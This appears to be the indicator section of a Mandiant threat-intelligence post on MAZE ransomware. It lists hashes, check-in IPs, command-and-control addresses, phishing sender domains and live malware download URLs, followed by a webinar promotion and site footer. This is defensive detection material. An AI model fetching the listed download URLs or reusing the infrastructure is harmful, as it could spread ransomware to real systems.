Payloads064058cf092063a5b69ed8fd2a1a04fe0f841c6332c89eaa7cac14c9d5b1d35b108a298b4ed5b4e77541061f32e5575111308e450b1f17954f531122a56fae3b15d7dd126391b0e7963c562a6cf3992c21a563f958b73d453ad91e251b11855c27c5ecbb94b84c315d56673a851b6cf92f78ff32cbb3c478865a88276248d419335aba8d135cc2e66549080ec9e8c8b73bfcba2dd05e1c75f86c008f4d245f6246b98ee908d08f15137e509e5e69db1b5774f35d180c0702741a46d98190ff375df79164b6d0661277f11691121b1d53658e9deec68cf5d33ee0779f54806cc265cf08ffaf12e47de8cd37098aac5b3379d137d91be9819930eeb3876e4fbe798045b3d2d4a6084f14618b028710ce858205a1106ae91d0b0705992d61e84ab283b8d994b989f6cbeea3e1a5d68ca5d8868d604146e7e5cb5995934b085846e387239ce48fc8196a5ab66d8562f48f2689e1ddb8cc86c710ee068d6c6bf300f4910aa49813ee4cc7e4fa0074db5e454a9eb13d56c363df67490bcc2149229e4ca0c5b4adbcd9eb6de9d32537b16c423ba3a3495ae2fc83479baeaf1878e1ea84b02be7a336dcc6635172e0d6ec24c554b40a9eda37493425782bda4a3d9dad58b4d6cb4e52bb525ebe43349076a240dfb6786f141148925010122819047d1882b93616a1ea4f4a131cc0507e6c789f94bd9838d84fd77205011e8b0c2bd711e0be537a66d01c67076c8491b05866c894bf2e43ff8542e73c1b27291e0df06afdc3ce5e8075f506e396ee601f2757a2bdd2dda72ff2fbbb89bd871c5fc21ee96ad3eaab616883fcf51dcbdb4769dd86dfd552be44a11d831e874e05cadafe04b6deebbea18401e8b5e83c410c6d3a8b4edfa4631ec2b8459b1041168b1b1d5105e57ba11045a4b7bc30bd2d33498ef194e69a8eb94f65480980deaf1ff5a431a6ef95c48e750c1a3b1af8f5446fa04f54f04d404d84be66e64a584d425844b926f457bb5060543db3146291d8c9ad1001f5ecda7dd8bb1c514f93c09cea8ae00df83cef2bf33a4d43e58b771e81af3eccfba4cbb7167176990d5a8d24e9505f71Maze Check-in IPs91.218.114.1191.218.114.2591.218.114.2691.218.114.3191.218.114.3291.218.114.3791.218.114.3891.218.114.491.218.114.7791.218.114.7992.63.11.15192.63.15.6 92.63.15.8 92.63.17.24592.63.194.2092.63.194.392.63.29.13792.63.32.2 92.63.32.5292.63.32.5592.63.32.5792.63.37.10092.63.8.47Maze-related Domainsaoacugmutagkwctu[.]onionmazedecrypt[.]top mazenews[.]topnewsmaze[.]topMaze Download URLshttp://104.168.174.32/wordupd_3.0.1.tmphttp://104.168.198.208/wordupd.tmphttp://104.168.201.35/dospizdos.tmphttp://104.168.201.47/wordupd.tmphttp://104.168.215.54/wordupd.tmphttp://149.56.245.196/wordupd.tmphttp://192.119.106.235/mswordupd.tmphttp://192.119.106.235/officeupd.tmphttp://192.99.172.143/winupd.tmphttp://54.39.233.188/win163.65.tmphttp://91.208.184.174:8079/windef.exehttp://agenziainformazioni[.]icu/wordupd.tmphttp://www.download-invoice[.]site/Invoice_29557473.exeMalicious Documents1a26c9b6ba40e4e3c3dce12de266ae1053d5bdc6bd7904b44078cf80e239d42b79271dc08052480a578d583a298951c5a2d631fcb08a6c840c23a8f46f6892ddad30987a53b1b0264d806805ce1a2561c09af442e8c808c953f4fa461956a30fee26e33725b14850b1776a67bd8f2d0aBEACON C2s173.209.43.61193.36.237.17337.1.213.937.252.7.1425.199.167.188checksoffice[.]medrivers.updatecenter[.]icuplaintsotherest[.]netthesawmeinrew[.]netupdates.updatecenter[.]icuCobalt Strike Binaries7507fe19afbda652e9b2768c10ad639fa93b86b2530cc988f801462ead702d844f57e35a89e257952c3809211bef78eabad6fc87a98d1663be0df23aedaf1c62f5ef96251f183f7fc63205d8ebf30cbfc818cc38f46c604f8576118f12fd0a63078cf6db38725c37030c79ef73519c0cc255daaa8abfadc12c9ae8ae2d148b311fef99f05bf5ae78a28d521612506057cebe4799b6aff9cead533536b09fecd14ccca6ff9b667a01df55326fcc850219bad6fc87a98d1663be0df23aedaf1c62Meterpreter C2s5.199.167.188Other Related Files3A5A9D40D4592C344920DD082029B362 (related script)76f8f28bd51efa03ab992fdb050c8382 (MAZE execution artifact)b5aa49c1bf4179452a85862ade3ef317 (windows.bat kill script) fad3c6914d798e29a3fd8e415f1608f4 (related script)Tools & Utilities27304b246c7d5b4e149124d5f93c5b01 (PsExec)42badc1d2f03a8b1e4875740d3d49336 (7zip)75b55bb34dac9d02740b9ad6b6820360 (PsExec)9b02dd2a1a15e94922be3f85129083ac (AdFind)c621a9f931e4ebf37dace74efcce11f2 (SMBTools)f413b4a2242bb60829c9a470eea4dfb6 (winRAR) Email Sender Domainsatt-customer[.]comatt-information[.]comatt-newsroom[.]comatt-plans[.]combezahlen-1und1[.]icubzst-info[.]icubzst-inform[.]icubzstinfo[.]icubzstinform[.]icucanada-post[.]icucanadapost-delivery[.]icucanadapost-tracking[.]icuhilfe-center-1und1[.]icuhilfe-center-internetag[.]icutrackweb-canadapost[.]icuSender Domain Registrant Addressesabusereceive@hitler.rocksgladkoff1991@yandex.ruMandiant Threat Intelligence will host an exclusive webinar on Thursday, May 21, 2020, at 8 a.m. PT / 11 a.m. ET to provide updated insight and information into the MAZE ransomware threat, and to answer questions from attendees. Register today to reserve your spot. Link to RSS feedPrepare for 2024's cybersecurity landscape.Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon. Download now  Have questions? Let's talk.Mandiant experts are ready to answer your questions. Contact Us  Follow us Footer Mandiant Advantage Platform Platform Overview Security Validation Attack Surface Management Threat Intelligence Digital Threat Monitoring Managed Defense Solutions Proactive Exposure Management Ransomware Industrial Controls & OT Cyber Risk Management Digital Risk Protection Insider Threats Cyber Security Skills Gap Election Security Government Cyber Security Manufacturing Cyber Threat Visibility Attack Surface Visibility Cyber Preparedness Detection and Response Financial Services Cyber Security Services Services Overview Incident Response Strategic Readiness Cyber Security Transformation Technical Assurance View all Services (48) Expertise on Demand Mandiant Academy Overview Education Formats Upcoming Courses On-Demand Courses Certifications ThreatSpace Cyber Range Free Course Sneak Peaks Resources Resource Center Blog Podcasts  Customer Stories Reports Webinars Insights eBooks Infographics White Papers Datasheets Company About Us Careers Events Media Center Partners Partners Overview Technology Partners Cyber Risk Partners Service Partners Channel Partners Partner Portal Connect with Mandiant Contact Us Report an Incident Customer Support Customer Success Media Inquiries  REPORTMandiant frontline observations provide insights into today’s top cyber defense topics.Learn about the 4 critical areas.  Get the Report  © Copyright 2024 Mandiant. All rights reserved.Bottom Website Privacy Policy Terms & Conditions Compliance Site Map  